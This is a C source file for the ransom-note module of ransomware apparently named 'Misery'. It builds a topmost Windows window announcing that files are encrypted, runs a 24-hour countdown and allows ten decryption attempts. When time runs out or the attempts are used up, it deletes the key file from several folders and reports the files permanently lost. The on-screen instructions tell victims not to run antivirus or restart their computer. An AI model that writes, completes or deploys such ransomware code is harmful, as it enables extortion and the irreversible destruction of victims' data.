/* =================================================================
 * ransomnote.c  —  Native Win32 Ransom Note Window
 *   + 24-hour countdown timer (starts immediately)
 *   + 10-try decryption limit (key destroyed on failure)
 *   + Minimize / Maximize buttons
 * ================================================================= */
#include <windows.h>
#include <commctrl.h>
#include <stdio.h>
#include <process.h>
#include <shlobj.h>
#include "ransomnote.h"
#include "crypto.h"
#include "fileops.h"
#include "misery_config.h"

/* ── Colour palette ── */
#define CLR_BG          RGB(245, 225, 225)
#define CLR_BANNER_BG   RGB(40,   8,   8)
#define CLR_ACCENT      RGB(60, 160,  80)
#define CLR_ACCENT_DARK RGB(35, 110,  50)
#define CLR_HEADLINE    RGB(220,  80,  80)
#define CLR_WHITE       RGB(248, 248, 248)
#define CLR_CARD_BG     RGB(50,  12,  12)
#define CLR_CARD_TEXT   RGB(230, 200, 200)
#define CLR_BODY_TEXT   RGB(30,  15,  15)
#define CLR_CODE_BG     RGB(235, 252, 235)
#define CLR_DECRYPT_BG  RGB(225, 240, 225)
#define CLR_TIMER_RED   RGB(220,   0,   0)
#define CLR_TIMER_BG    RGB(60,   8,   8)

#define WC_RANSOM   L"MiseryRansomNote"
#define WIN_TITLE   L"MISERY - Security Event"

/* ── Control IDs ── */
#define IDC_CLOSE        1001
#define IDC_DECRYPT_KEY  1002
#define IDC_DECRYPT_BTN  1003
#define IDC_STATUS       1004
#define IDC_TIMER        1005
#define IDC_ATTEMPTS     1006

#define WM_DECRYPT_DONE (WM_APP + 1)

/* ── Brushes and fonts ── */
static HBRUSH  g_hbrBanner    = NULL;
static HBRUSH  g_hbrBg        = NULL;
static HBRUSH  g_hbrCard      = NULL;
static HBRUSH  g_hbrAccent    = NULL;
static HBRUSH  g_hbrCodeBg    = NULL;
static HBRUSH  g_hbrDecryptBg = NULL;
static HBRUSH  g_hbrTimerBg   = NULL;
static HBRUSH  g_hbrCloseBtn  = NULL;
static HFONT   g_hFontHead    = NULL;
static HFONT   g_hFontSub     = NULL;
static HFONT   g_hFontBody    = NULL;
static HFONT   g_hFontSmall   = NULL;
static HFONT   g_hFontMono    = NULL;
static HFONT   g_hFontName    = NULL;
static HFONT   g_hFontTimer   = NULL;

/* ── Module state ── */
static ULONGLONG g_timerEndFileTime = 0;
static int       g_decryptAttempts  = 0;
static const int MAX_DECRYPT_ATTEMPTS = 10;

/* ── Forward declarations ── */
static LRESULT CALLBACK RansomWndProc(HWND, UINT, WPARAM, LPARAM);
static void     CreateResources(void);
static void     DestroyResources(void);
static void     UpdateTimerDisplay(HWND hWnd);
static void     UpdateAttemptsDisplay(HWND hWnd);
static void     DestroyKeyAndClose(HWND hWnd);
void ShowRansomNoteWindow(void);

/* ── Decrypt thread parameter ── */
typedef struct {
    char  key[256];
    HWND  hWnd;
} DECRYPT_THREAD_PARAMS;

/* ── Decrypt worker thread ── */
static unsigned int __stdcall DecryptThreadProc(void *lpParam) {
    DECRYPT_THREAD_PARAMS *p = (DECRYPT_THREAD_PARAMS *)lpParam;
    FILEOPS_STATS stats = {0};

    BOOL success = MiseryRunDecrypt(p->key, &stats);

    if (p->hWnd && IsWindow(p->hWnd)) {
        PostMessage(p->hWnd, WM_DECRYPT_DONE,
                    (WPARAM)(success ? (LONGLONG)stats.filesSucceeded : -1),
                    (LPARAM)(success ? (LONGLONG)stats.filesFailed : 0));
    }

    free(p);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════
 * Show the ransom note window (blocking)
 * ═══════════════════════════════════════════════════════════════ */
void ShowRansomNoteWindow(void) {
    HMODULE hInst = GetModuleHandle(NULL);
    INITCOMMONCONTROLSEX icc = { sizeof(icc), ICC_WIN95_CLASSES };
    InitCommonControlsEx(&icc);

    CreateResources();

    WNDCLASSEXW wc;
    ZeroMemory(&wc, sizeof(wc));
    wc.cbSize        = sizeof(wc);
    wc.lpfnWndProc   = RansomWndProc;
    wc.hInstance     = hInst;
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = g_hbrBg;
    wc.lpszClassName = WC_RANSOM;
    wc.hIcon         = LoadIcon(NULL, IDI_WARNING);
    wc.hIconSm       = LoadIcon(NULL, IDI_WARNING);
    RegisterClassExW(&wc);

    /* ══════════════════════════════════════════════════════════
     * CRITICAL: Set timer BEFORE CreateWindowExW because
     * WM_CREATE (which calls SetTimer) fires synchronously
     * inside CreateWindowExW. If g_timerEndFileTime is 0,
     * the first 1-second tick will immediately trigger
     * DestroyKeyAndClose().
     * ══════════════════════════════════════════════════════════ */
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    g_timerEndFileTime = ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    g_timerEndFileTime += (ULONGLONG)24 * 60 * 60 * 10000000ULL; /* 24 hours */
    g_decryptAttempts = 0;

    int winW = 860, winH = 750;
    int scrW = GetSystemMetrics(SM_CXSCREEN);
    int scrH = GetSystemMetrics(SM_CYSCREEN);
    int posX = (scrW - winW) / 2;
    int posY = (scrH - winH) / 2;

    HWND hWnd = CreateWindowExW(
        WS_EX_TOPMOST,
        WC_RANSOM, WIN_TITLE,
        WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX,
        posX, posY, winW, winH,
        NULL, NULL, hInst, NULL
    );

    if (!hWnd) { DestroyResources(); return; }

    ShowWindow(hWnd, SW_SHOW);
    UpdateWindow(hWnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DestroyResources();
}

/* ═══════════════════════════════════════════════════════════════
 * WINDOW PROC
 * ═══════════════════════════════════════════════════════════════ */
static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {

    case WM_CREATE: {
        HINSTANCE hInst = (HINSTANCE)GetWindowLongPtrW(hWnd, GWLP_HINSTANCE);

        /* ── Banner ── */
        HWND hBanner = CreateWindowExW(0, L"STATIC", NULL,
            WS_CHILD | WS_VISIBLE | SS_NOTIFY,
            0, 0, 860, 170, hWnd, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", NULL, WS_CHILD | WS_VISIBLE,
            0, 0, 860, 5, hBanner, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"\U0001F512", WS_CHILD | WS_VISIBLE,
            30, 20, 60, 50, hBanner, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"YOUR FILES HAVE BEEN ENCRYPTED",
            WS_CHILD | WS_VISIBLE, 100, 18, 700, 40, hBanner, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC",
            L"All your documents, images, databases, and source code "
            L"have been locked with AES-256 encryption.",
            WS_CHILD | WS_VISIBLE, 100, 60, 700, 22, hBanner, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"  \u2713  ENCRYPTION COMPLETE  ",
            WS_CHILD | WS_VISIBLE | SS_CENTERIMAGE,
            100, 92, 240, 28, hBanner, NULL, hInst, NULL);

        /* ── Timer display (right side of banner) ──
         *  FIX: Direct child of hWnd, NOT hBanner.
         *  This ensures GetDlgItem(hWnd, IDC_TIMER) finds it,
         *  and WM_CTLCOLORSTATIC reaches RansomWndProc. */
        CreateWindowExW(0, L"STATIC", L"24:00:00",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            640, 95, 180, 60, hWnd, (HMENU)IDC_TIMER, hInst, NULL);

        /* ── Instructions body ── */
        const WCHAR *instructions =
            L"═══════════════════════════════════════════════\n"
            L"  INSTRUCTIONS TO RECOVER YOUR FILES\n"
            L"═══════════════════════════════════════════════\n\n"
            L"  \u2705  DO NOT attempt to decrypt files yourself \u2014 any\n"
            L"      modification will cause permanent data loss.\n\n"
            L"  \u2705  DO NOT run antivirus scans that may delete the\n"
            L"      decryption key file \"misery.key\".\n\n"
            L"  \u2705  DO NOT shut down or restart your computer before\n"
            L"      contacting the security researcher below.\n\n"
            L"  \u2705  You have 24 hours and 10 decryption attempts.\n"
            L"      After both are exhausted, the key is destroyed.\n\n"
            L"  \u26A0  Any attempt to reverse or modify encrypted files\n"
            L"      without the correct key will result in\n"
            L"      IRREVERSIBLE DATA LOSS.";

        CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", instructions,
            WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY |
            ES_AUTOVSCROLL | ES_LEFT,
            30, 185, 800, 160, hWnd, NULL, hInst, NULL);

        /* ── Contact card ── */
        HWND hCard = CreateWindowExW(0, L"STATIC", NULL,
            WS_CHILD | WS_VISIBLE, 30, 360, 800, 85, hWnd, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", NULL, WS_CHILD | WS_VISIBLE,
            0, 0, 5, 85, hCard, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"SECURITY RESEARCHER",
            WS_CHILD | WS_VISIBLE, 20, 8, 300, 18, hCard, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"Jahanzaib Ashraf Mir",
            WS_CHILD | WS_VISIBLE, 20, 28, 500, 32, hCard, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC",
            L"Cybersec Engineer  |  Hacker  |  Malware Researcher",
            WS_CHILD | WS_VISIBLE, 20, 62, 500, 20, hCard, NULL, hInst, NULL);

        /* ── Decryption Section ── */
        HWND hDecryptPanel = CreateWindowExW(0, L"STATIC", NULL,
            WS_CHILD | WS_VISIBLE | SS_NOTIFY,
            30, 460, 800, 130, hWnd, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"\u26A0  DECRYPTION UTILITY",
            WS_CHILD | WS_VISIBLE, 15, 5, 300, 22, hDecryptPanel, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC",
            L"Enter the decryption key to recover your files:",
            WS_CHILD | WS_VISIBLE, 15, 30, 400, 18, hDecryptPanel, NULL, hInst, NULL);

        HWND hKeyEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | WS_TABSTOP,
            15, 52, 500, 26, hDecryptPanel, (HMENU)IDC_DECRYPT_KEY, hInst, NULL);
        SendMessage(hKeyEdit, EM_LIMITTEXT, 64, 0);

        CreateWindowExW(0, L"BUTTON", L"DECRYPT FILES",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_TABSTOP,
            530, 50, 140, 30, hDecryptPanel, (HMENU)IDC_DECRYPT_BTN, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"",
            WS_CHILD | WS_VISIBLE, 15, 90, 600, 24, hDecryptPanel, (HMENU)IDC_STATUS, hInst, NULL);

        /* ── Footer: reference info ── */
        WCHAR refBuf[512];
        wcscpy(refBuf, L"Reference Code:  MISERY-XXXX-XXXX-XXXX\n");
        wcscat(refBuf, L"Key File:        C:\\Users\\[USER]\\Desktop\\misery.key\n");
        wcscat(refBuf, L"Algorithm:       AES-256-CBC  +  HMAC-SHA256");

        CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", refBuf,
            WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY | ES_LEFT,
            30, 605, 800, 50, hWnd, NULL, hInst, NULL);

        /* ── Bottom status bar ── */
        CreateWindowExW(0, L"STATIC", L"Attempts: 0 / 10",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            30, 670, 300, 35, hWnd, (HMENU)IDC_ATTEMPTS, hInst, NULL);

        CreateWindowExW(0, L"BUTTON", L"  CLOSE  ",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_TABSTOP,
            680, 670, 130, 40, hWnd, (HMENU)IDC_CLOSE, hInst, NULL);

        /* ── Start 1-second timer ── */
        SetTimer(hWnd, 1, 1000, NULL);

        return 0;
    }

    /* ── Timer tick: update countdown every second ── */
    case WM_TIMER: {
        if (wParam == 1) {
            UpdateTimerDisplay(hWnd);

            /* Check if timer expired */
            FILETIME ftNow;
            GetSystemTimeAsFileTime(&ftNow);
            ULONGLONG now = ((ULONGLONG)ftNow.dwHighDateTime << 32) | ftNow.dwLowDateTime;

            if (now >= g_timerEndFileTime) {
                KillTimer(hWnd, 1);
                DestroyKeyAndClose(hWnd);
                return 0;
            }
        }
        return 0;
    }

    /* ── Colour controls ── */
    case WM_CTLCOLORSTATIC: {
        HDC     hdc = (HDC)wParam;
        HWND    hCtrl = (HWND)lParam;
        WCHAR   winText[128] = {0};
        GetWindowTextW(hCtrl, winText, 128);

        /* Timer display — now reachable because IDC_TIMER is a direct child */
        if (hCtrl == GetDlgItem(hWnd, IDC_TIMER)) {
            SetTextColor(hdc, CLR_TIMER_RED);
            SetBkColor(hdc, CLR_TIMER_BG);
            SelectObject(hdc, g_hFontTimer);
            return (LRESULT)g_hbrTimerBg;
        }
        /* Attempts display */
        if (hCtrl == GetDlgItem(hWnd, IDC_ATTEMPTS)) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_BANNER_BG);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)g_hbrBanner;
        }
        if (wcsstr(winText, L"YOUR FILES HAVE BEEN ENCRYPTED")) {
            SetTextColor(hdc, CLR_HEADLINE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontHead);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"All your documents")) {
            SetTextColor(hdc, RGB(200, 170, 170));
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontSub);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"ENCRYPTION COMPLETE")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_ACCENT_DARK);
            SelectObject(hdc, g_hFontSmall);
            return (LRESULT)g_hbrAccent;
        }
        if (wcsstr(winText, L"SECURITY RESEARCHER")) {
            SetTextColor(hdc, CLR_ACCENT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"Jahanzaib Ashraf Mir")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontName);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"Cybersec Engineer")) {
            SetTextColor(hdc, CLR_CARD_TEXT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"\U0001F512")) {
            SetTextColor(hdc, CLR_ACCENT);
            SetBkMode(hdc, TRANSPARENT);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"DECRYPTION UTILITY")) {
            SetTextColor(hdc, CLR_HEADLINE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"Enter the decryption key")) {
            SetTextColor(hdc, CLR_BODY_TEXT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        /* Default: status text, etc. */
        SetTextColor(hdc, CLR_BODY_TEXT);
        SetBkMode(hdc, TRANSPARENT);
        SelectObject(hdc, g_hFontBody);
        return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
    }

    case WM_CTLCOLOREDIT: {
        HDC hdc = (HDC)wParam;
        HWND hCtrl = (HWND)lParam;
        WCHAR winText[256] = {0};
        GetWindowTextW(hCtrl, winText, 256);

        if (wcsstr(winText, L"INSTRUCTIONS")) {
            SetTextColor(hdc, CLR_BODY_TEXT);
            SetBkColor(hdc, CLR_BG);
            SelectObject(hdc, g_hFontMono);
            return (LRESULT)g_hbrBg;
        }
        if (wcsstr(winText, L"Reference Code:")) {
            SetTextColor(hdc, RGB(20, 60, 20));
            SetBkColor(hdc, CLR_CODE_BG);
            SelectObject(hdc, g_hFontMono);
            return (LRESULT)g_hbrCodeBg;
        }
        /* Key edit control */
        SetTextColor(hdc, RGB(0, 40, 0));
        SetBkColor(hdc, CLR_DECRYPT_BG);
        SelectObject(hdc, g_hFontMono);
        return (LRESULT)g_hbrDecryptBg;
    }

    case WM_CTLCOLORBTN: {
        HDC hdc = (HDC)wParam;
        HWND hCtrl = (HWND)lParam;
        WCHAR btnText[32] = {0};
        GetWindowTextW(hCtrl, btnText, 32);

        if (wcsstr(btnText, L"CLOSE")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_HEADLINE);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)g_hbrCloseBtn;
        }
        if (wcsstr(btnText, L"DECRYPT")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_ACCENT_DARK);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)g_hbrAccent;
        }
        return DefWindowProcW(hWnd, msg, wParam, lParam);
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_CLOSE) {
            DestroyWindow(hWnd);
            return 0;
        }

        if (LOWORD(wParam) == IDC_DECRYPT_BTN) {
            /* Check attempts limit */
            if (g_decryptAttempts >= MAX_DECRYPT_ATTEMPTS) {
                MessageBoxA(hWnd,
                    "Maximum decryption attempts (10/10) exceeded.\n"
                    "The key will now be destroyed.",
                    "Access Denied", MB_OK | MB_ICONERROR);
                DestroyKeyAndClose(hWnd);
                return 0;
            }

            HWND hKeyEdit = GetDlgItem(hWnd, IDC_DECRYPT_KEY);
            HWND hStatus  = GetDlgItem(hWnd, IDC_STATUS);

            WCHAR keyWide[128] = {0};
            GetWindowTextW(hKeyEdit, keyWide, 128);

            char key[256] = {0};
            WideCharToMultiByte(CP_UTF8, 0, keyWide, -1, key, sizeof(key), NULL, NULL);

            if (strlen(key) == 0) {
                SetWindowTextA(hStatus, "Please enter a decryption key.");
                return 0;
            }

            g_decryptAttempts++;
            UpdateAttemptsDisplay(hWnd);

            EnableWindow(GetDlgItem(hWnd, IDC_DECRYPT_BTN), FALSE);
            SetWindowTextA(hStatus, "Decrypting files... please wait.");

            DECRYPT_THREAD_PARAMS *params = (DECRYPT_THREAD_PARAMS *)
                malloc(sizeof(DECRYPT_THREAD_PARAMS));
            if (params) {
                strncpy(params->key, key, sizeof(params->key) - 1);
                params->key[sizeof(params->key) - 1] = '\0';
                params->hWnd = hWnd;
                HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, DecryptThreadProc, params, 0, NULL);
                if (hThread) {
                    CloseHandle(hThread);
                } else {
                    free(params);
                    SetWindowTextA(hStatus, "Failed to start decryption thread.");
                    EnableWindow(GetDlgItem(hWnd, IDC_DECRYPT_BTN), TRUE);
                }
            }
            return 0;
        }
        break;

    case WM_DECRYPT_DONE: {
        HWND hStatus = GetDlgItem(hWnd, IDC_STATUS);
        LONGLONG succeeded = (LONGLONG)wParam;
        LONGLONG failed = (LONGLONG)lParam;

        char msgBuf[512];
        if (succeeded == -1) {
            /* Wrong key */
            int remaining = MAX_DECRYPT_ATTEMPTS - g_decryptAttempts;
            snprintf(msgBuf, sizeof(msgBuf),
                "Decryption FAILED: The key is incorrect.\n"
                "Attempts remaining: %d / %d",
                remaining, MAX_DECRYPT_ATTEMPTS);

            SetWindowTextA(hStatus, msgBuf);

            if (g_decryptAttempts >= MAX_DECRYPT_ATTEMPTS) {
                MessageBoxA(hWnd,
                    "Maximum decryption attempts (10/10) reached.\n"
                    "The encryption key is now being destroyed.\n"
                    "YOUR FILES ARE PERMANENTLY LOST.",
                    "KEY DESTROYED", MB_OK | MB_ICONERROR);
                DestroyKeyAndClose(hWnd);
                return 0;
            }

            MessageBoxA(hWnd, msgBuf, "Decryption Failed", MB_OK | MB_ICONWARNING);
            EnableWindow(GetDlgItem(hWnd, IDC_DECRYPT_BTN), TRUE);

        } else {
            /* Success */
            if (failed == 0 && succeeded == 0) {
                snprintf(msgBuf, sizeof(msgBuf),
                    "No encrypted files were found. Nothing to decrypt.");
            } else {
                snprintf(msgBuf, sizeof(msgBuf),
                    "Decryption complete: %lld files recovered, %lld failed.",
                    succeeded, failed);
            }
            SetWindowTextA(hStatus, msgBuf);
            MessageBoxA(hWnd, msgBuf, "Decryption Successful", MB_OK | MB_ICONINFORMATION);
            EnableWindow(GetDlgItem(hWnd, IDC_DECRYPT_BTN), TRUE);
        }
        return 0;
    }

    case WM_DESTROY:
        KillTimer(hWnd, 1);
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hWnd, msg, wParam, lParam);
}

/* ═══════════════════════════════════════════════════════════════
 * Update timer display
 * ═══════════════════════════════════════════════════════════════ */
static void UpdateTimerDisplay(HWND hWnd) {
    FILETIME ftNow;
    GetSystemTimeAsFileTime(&ftNow);
    ULONGLONG now = ((ULONGLONG)ftNow.dwHighDateTime << 32) | ftNow.dwLowDateTime;

    if (now >= g_timerEndFileTime) {
        SetDlgItemTextA(hWnd, IDC_TIMER, "00:00:00");
        return;
    }

    ULONGLONG diff100ns = g_timerEndFileTime - now;
    ULONGLONG totalSeconds = diff100ns / 10000000ULL;

    DWORD hours   = (DWORD)(totalSeconds / 3600);
    DWORD minutes = (DWORD)((totalSeconds % 3600) / 60);
    DWORD seconds = (DWORD)(totalSeconds % 60);

    char timeBuf[32];
    snprintf(timeBuf, sizeof(timeBuf), "%02lu:%02lu:%02lu", hours, minutes, seconds);
    SetDlgItemTextA(hWnd, IDC_TIMER, timeBuf);
}

/* ═══════════════════════════════════════════════════════════════
 * Update attempts display
 * ═══════════════════════════════════════════════════════════════ */
static void UpdateAttemptsDisplay(HWND hWnd) {
    char buf[64];
    snprintf(buf, sizeof(buf), "Attempts: %d / %d",
             g_decryptAttempts, MAX_DECRYPT_ATTEMPTS);
    SetDlgItemTextA(hWnd, IDC_ATTEMPTS, buf);
    MiseryLog(MISERY_LOG_INFO, "RansomNote: Attempts updated: %d/%d",
              g_decryptAttempts, MAX_DECRYPT_ATTEMPTS);
}

/* ═══════════════════════════════════════════════════════════════
 * Destroy key and close — permanent data loss
 * ═══════════════════════════════════════════════════════════════ */
static void DestroyKeyAndClose(HWND hWnd) {
    MiseryLog(MISERY_LOG_WARN, "RansomNote: Key destruction triggered!");

    /* Delete misery.key from all locations */
    DeleteFileA("misery.key");

    char desktop[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
        char keyPath[MAX_PATH * 2];
        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", desktop);
        DeleteFileA(keyPath);
    }

    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath)) {
        char keyPath3[MAX_PATH * 2];
        snprintf(keyPath3, sizeof(keyPath3), "%s\\misery.key", tempPath);
        DeleteFileA(keyPath3);
    }

    char curDir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, curDir);
    if (_stricmp(curDir, desktop) != 0 && _stricmp(curDir, tempPath) != 0) {
        char keyPath2[MAX_PATH * 2];
        snprintf(keyPath2, sizeof(keyPath2), "%s\\misery.key", curDir);
        DeleteFileA(keyPath2);
    }

    /* Nuke crypto context in memory */
    CleanupCrypto();

    /* Show final message */
    MessageBoxA(hWnd,
        "TIME EXPIRED \u2014 The decryption key has been destroyed.\n"
        "YOUR FILES ARE PERMANENTLY UNRECOVERABLE.",
        "FILES LOST FOREVER", MB_OK | MB_ICONERROR);

    KillTimer(hWnd, 1);
    DestroyWindow(hWnd);
    /* WM_DESTROY will post the quit message */
}

/* ═══════════════════════════════════════════════════════════════
 * RESOURCE CREATION
 * ═══════════════════════════════════════════════════════════════ */
static void CreateResources(void) {
    g_hbrBanner    = CreateSolidBrush(CLR_BANNER_BG);
    g_hbrBg        = CreateSolidBrush(CLR_BG);
    g_hbrCard      = CreateSolidBrush(CLR_CARD_BG);
    g_hbrAccent    = CreateSolidBrush(CLR_ACCENT_DARK);
    g_hbrCodeBg    = CreateSolidBrush(CLR_CODE_BG);
    g_hbrDecryptBg = CreateSolidBrush(CLR_DECRYPT_BG);
    g_hbrTimerBg   = CreateSolidBrush(CLR_TIMER_BG);
    g_hbrCloseBtn  = CreateSolidBrush(CLR_HEADLINE);

    LOGFONTW lf;
    ZeroMemory(&lf, sizeof(lf));

    lf.lfHeight  = -26; lf.lfWeight = FW_BOLD;
    lf.lfQuality = CLEARTYPE_QUALITY;
    wcscpy(lf.lfFaceName, L"Segoe UI");
    g_hFontHead = CreateFontIndirectW(&lf);

    lf.lfHeight = -14; lf.lfWeight = FW_NORMAL;
    g_hFontSub = CreateFontIndirectW(&lf);

    lf.lfHeight = -13;
    g_hFontBody = CreateFontIndirectW(&lf);

    lf.lfHeight = -11; lf.lfWeight = FW_BOLD;
    g_hFontSmall = CreateFontIndirectW(&lf);

    lf.lfHeight = -12; lf.lfWeight = FW_NORMAL;
    wcscpy(lf.lfFaceName, L"Consolas");
    g_hFontMono = CreateFontIndirectW(&lf);

    lf.lfHeight = -22; lf.lfWeight = FW_BOLD;
    wcscpy(lf.lfFaceName, L"Segoe UI");
    g_hFontName = CreateFontIndirectW(&lf);

    lf.lfHeight = -36; lf.lfWeight = FW_BOLD;
    wcscpy(lf.lfFaceName, L"Consolas");
    g_hFontTimer = CreateFontIndirectW(&lf);
}

static void DestroyResources(void) {
    if (g_hbrBanner)   DeleteObject(g_hbrBanner);
    if (g_hbrBg)       DeleteObject(g_hbrBg);
    if (g_hbrCard)     DeleteObject(g_hbrCard);
    if (g_hbrAccent)   DeleteObject(g_hbrAccent);
    if (g_hbrCodeBg)   DeleteObject(g_hbrCodeBg);
    if (g_hbrDecryptBg) DeleteObject(g_hbrDecryptBg);
    if (g_hbrTimerBg)  DeleteObject(g_hbrTimerBg);
    if (g_hbrCloseBtn) DeleteObject(g_hbrCloseBtn);
    if (g_hFontHead)   DeleteObject(g_hFontHead);
    if (g_hFontSub)    DeleteObject(g_hFontSub);
    if (g_hFontBody)   DeleteObject(g_hFontBody);
    if (g_hFontSmall)  DeleteObject(g_hFontSmall);
    if (g_hFontMono)   DeleteObject(g_hFontMono);
    if (g_hFontName)   DeleteObject(g_hFontName);
    if (g_hFontTimer)  DeleteObject(g_hFontTimer);
}